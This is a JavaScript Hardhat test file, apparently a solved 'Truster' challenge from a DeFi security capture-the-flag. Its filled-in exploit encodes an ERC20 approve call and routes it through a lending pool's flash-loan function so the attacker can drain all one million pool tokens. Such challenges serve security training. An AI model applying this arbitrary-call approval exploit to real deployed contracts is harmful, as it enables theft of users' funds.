const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory("DamnValuableToken", deployer);
    const TrusterLenderPool = await ethers.getContractFactory("TrusterLenderPool", deployer);

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async function () {
    const attackContractDeployer = await ethers.getContractFactory("TrustAttackContract", attacker);
    const attackContract = await attackContractDeployer.deploy(this.pool.address, this.token.address);

    /** CODE YOUR EXPLOIT HERE  */

    const abi = ["function approve(address spender, uint256 amount)"];
    const iface = new ethers.utils.Interface(abi);
    const data = iface.encodeFunctionData("approve", [attackContract.address, TOKENS_IN_POOL]);

    await attackContract.attack(0, attacker.address, this.token.address, data);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
